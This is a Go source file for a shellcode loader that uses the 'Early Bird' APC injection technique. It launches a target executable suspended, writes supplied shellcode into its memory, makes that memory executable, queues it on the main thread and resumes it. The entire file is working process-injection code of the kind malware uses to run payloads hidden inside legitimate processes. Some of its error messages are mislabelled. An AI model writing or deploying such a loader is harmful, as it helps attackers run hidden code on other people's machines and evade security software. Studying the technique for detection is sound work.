package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func EarlyBird(shellcode []byte, path string) error {
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}

	appName, prtErr := windows.UTF16PtrFromString(path)
	if prtErr != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %v", prtErr)
	}

	args, prtErr := windows.UTF16PtrFromString("")
	if prtErr != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %v", prtErr)
	}

	cpErr := xwindows.CreateProcessW(
		appName,
		args,
		nil,
		nil,
		true,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		startupInfo,
		procInfo,
	)
	if cpErr != nil {
		return fmt.Errorf("CreateProcess failed: %w", cpErr)
	}

	addr, vaErr := xwindows.VirtualAllocEx(
		procInfo.Process,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
	)
	if vaErr != nil {
		return fmt.Errorf("VirtualAllocEx failed: %w", vaErr)
	}

	var numberOfBytesWritten uintptr
	wpErr := xwindows.WriteProcessMemory(
		procInfo.Process,
		addr,
		&shellcode[0],
		uintptr(len(shellcode)),
		&numberOfBytesWritten,
	)
	if wpErr != nil {
		return fmt.Errorf("VirtualAllocEx failed: %w", vaErr)
	}

	oldProtect := windows.PAGE_READWRITE
	vpErr := xwindows.VirtualProtectEx(
		procInfo.Process,
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		(*uint32)(unsafe.Pointer(&oldProtect)),
	)
	if vpErr != nil {
		return fmt.Errorf("VirtualProtectEx failed: %w", vpErr)
	}

	_, quErr := xwindows.QueueUserAPC(addr, uintptr(procInfo.Thread), 0)
	if quErr != nil {
		return fmt.Errorf("VirtualProtectEx failed: %w", quErr)
	}

	_, rtErr := windows.ResumeThread(procInfo.Thread)
	if rtErr != nil {
		return fmt.Errorf("ResumeThread failed: %w", rtErr)
	}
	chpErr := windows.CloseHandle(procInfo.Process)
	if chpErr != nil {
		return fmt.Errorf("CloseHandle failed: %w", chpErr)
	}
	chtErr := windows.CloseHandle(procInfo.Thread)
	if chtErr != nil {
		return fmt.Errorf("CloseHandle failed: %w", chtErr)
	}

	return nil
}
